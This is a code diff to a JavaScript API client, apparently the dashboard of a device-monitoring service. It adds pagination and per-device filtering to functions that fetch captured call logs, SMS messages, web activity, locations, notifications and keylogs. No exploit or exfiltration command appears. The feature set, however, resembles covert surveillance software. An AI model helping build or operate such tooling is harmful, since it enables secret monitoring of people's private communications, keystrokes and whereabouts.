@@ -20,36 +20,52 @@ const getAuthHeaders = (token) => ({
   },
 });
 
-const getCallLogs = (token) => {
-  return axios.get(`${API_URL}/users/me/call_logs/`, getAuthHeaders(token));
+const getCallLogs = (token, skip = 0, limit = 100, deviceId = null) => {
+  let url = `${API_URL}/users/me/call_logs/?skip=${skip}&limit=${limit}`;
+  if (deviceId) url += `&device_id=${deviceId}`;
+  return axios.get(url, getAuthHeaders(token));
 };
 
-const getSmsMessages = (token) => {
-  return axios.get(`${API_URL}/users/me/sms_messages/`, getAuthHeaders(token));
+const getSmsMessages = (token, skip = 0, limit = 100, deviceId = null) => {
+  let url = `${API_URL}/users/me/sms_messages/?skip=${skip}&limit=${limit}`;
+  if (deviceId) url += `&device_id=${deviceId}`;
+  return axios.get(url, getAuthHeaders(token));
 };
 
-const getAppUsage = (token) => {
-  return axios.get(`${API_URL}/users/me/app_usage/`, getAuthHeaders(token));
+const getAppUsage = (token, skip = 0, limit = 100, deviceId = null) => {
+  let url = `${API_URL}/users/me/app_usage/?skip=${skip}&limit=${limit}`;
+  if (deviceId) url += `&device_id=${deviceId}`;
+  return axios.get(url, getAuthHeaders(token));
 };
 
-const getWebActivity = (token) => {
-  return axios.get(`${API_URL}/users/me/web_activity/`, getAuthHeaders(token));
+const getWebActivity = (token, skip = 0, limit = 100, deviceId = null) => {
+  let url = `${API_URL}/users/me/web_activity/?skip=${skip}&limit=${limit}`;
+  if (deviceId) url += `&device_id=${deviceId}`;
+  return axios.get(url, getAuthHeaders(token));
 };
 
-const getLocations = (token) => {
-  return axios.get(`${API_URL}/users/me/locations/`, getAuthHeaders(token));
+const getLocations = (token, skip = 0, limit = 100, deviceId = null) => {
+  let url = `${API_URL}/users/me/locations/?skip=${skip}&limit=${limit}`;
+  if (deviceId) url += `&device_id=${deviceId}`;
+  return axios.get(url, getAuthHeaders(token));
 };
 
-const getInstalledApps = (token) => {
-  return axios.get(`${API_URL}/users/me/installed_apps/`, getAuthHeaders(token));
+const getInstalledApps = (token, skip = 0, limit = 100, deviceId = null) => {
+  let url = `${API_URL}/users/me/installed_apps/?skip=${skip}&limit=${limit}`;
+  if (deviceId) url += `&device_id=${deviceId}`;
+  return axios.get(url, getAuthHeaders(token));
 };
 
-const getNotifications = (token) => {
-  return axios.get(`${API_URL}/users/me/notifications/`, getAuthHeaders(token));
+const getNotifications = (token, skip = 0, limit = 100, deviceId = null) => {
+  let url = `${API_URL}/users/me/notifications/?skip=${skip}&limit=${limit}`;
+  if (deviceId) url += `&device_id=${deviceId}`;
+  return axios.get(url, getAuthHeaders(token));
 };
 
-const getKeylogs = (token) => {
-  return axios.get(`${API_URL}/users/me/keylogs/`, getAuthHeaders(token));
+const getKeylogs = (token, skip = 0, limit = 100, deviceId = null) => {
+  let url = `${API_URL}/users/me/keylogs/?skip=${skip}&limit=${limit}`;
+  if (deviceId) url += `&device_id=${deviceId}`;
+  return axios.get(url, getAuthHeaders(token));
 };
 
 const getDevices = (token) => {
